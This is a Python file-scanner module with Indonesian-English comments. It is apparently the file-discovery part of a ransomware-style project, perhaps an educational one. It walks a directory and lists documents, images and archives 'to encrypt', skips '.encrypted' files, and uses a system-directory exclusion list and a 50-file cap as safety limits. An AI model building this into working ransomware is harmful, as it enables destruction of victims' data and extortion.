"""
File Scanner Module
Fungsi: Scan directory untuk find target files
"""

import os

class FileScanner:
    def __init__(self, target_dir="test_data", max_files=50):
        """
        Initialize file scanner
        
        Args:
            target_dir: Directory untuk scan (DEFAULT: test_data)
            max_files: Maximum files untuk encrypt (safety limit)
        """
        self.target_dir = target_dir
        self.max_files = max_files
        
        # Target file extensions
        self.target_extensions = [
            '.txt', '.pdf', '.doc', '.docx', 
            '.xls', '.xlsx', '.ppt', '.pptx',
            '.jpg', '.jpeg', '.png', '.gif',
            '.zip', '.rar'
        ]
        
        # WHITELIST - directories yang TIDAK akan di-scan
        self.blacklist_dirs = [
            'C:\\Windows',
            'C:\\Program Files',
            'C:\\Program Files (x86)',
            '/System',
            '/usr',
            '/bin'
        ]
    
    def is_safe_directory(self, dir_path):
        """
        Check apakah directory aman untuk di-scan
        """
        dir_path = os.path.abspath(dir_path)
        
        for blacklist in self.blacklist_dirs:
            if dir_path.startswith(blacklist):
                print(f"[!] BLOCKED: {dir_path} is in blacklist!")
                return False
        
        return True
    
    def is_target_file(self, file_path):
        """
        Check apakah file adalah target
        """
        _, ext = os.path.splitext(file_path)
        return ext.lower() in self.target_extensions
    
    def scan_directory(self, directory=None):
        """
        Scan directory untuk target files
        
        Returns:
            List of file paths
        """
        if directory is None:
            directory = self.target_dir
        
        # Safety check
        if not self.is_safe_directory(directory):
            print("[!] Directory blocked by safety mechanism!")
            return []
        
        target_files = []
        
        print(f"[*] Scanning directory: {directory}")
        
        try:
            for root, dirs, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root, file)
                    
                    # Check if target file
                    if self.is_target_file(file_path):
                        # Check if already encrypted
                        if not file_path.endswith('.encrypted'):
                            target_files.append(file_path)
                            print(f"[+] Found: {file_path}")
                    
                    # Safety limit
                    if len(target_files) >= self.max_files:
                        print(f"[!] Reached max file limit ({self.max_files})")
                        return target_files
        
        except Exception as e:
            print(f"[-] Scan error: {str(e)}")
        
        print(f"[*] Total files found: {len(target_files)}")
        return target_files


# Testing code
if __name__ == "__main__":
    # Create test directory and files
    os.makedirs("test_data", exist_ok=True)
    
    test_files = ["test1.txt", "test2.pdf", "test3.jpg"]
    for fname in test_files:
        with open(f"test_data/{fname}", "w") as f:
            f.write("Sample data")
    
    # Scan
    scanner = FileScanner()
    files = scanner.scan_directory()
    
    print(f"\nFound {len(files)} target files:")
    for f in files:
        print(f"  - {f}")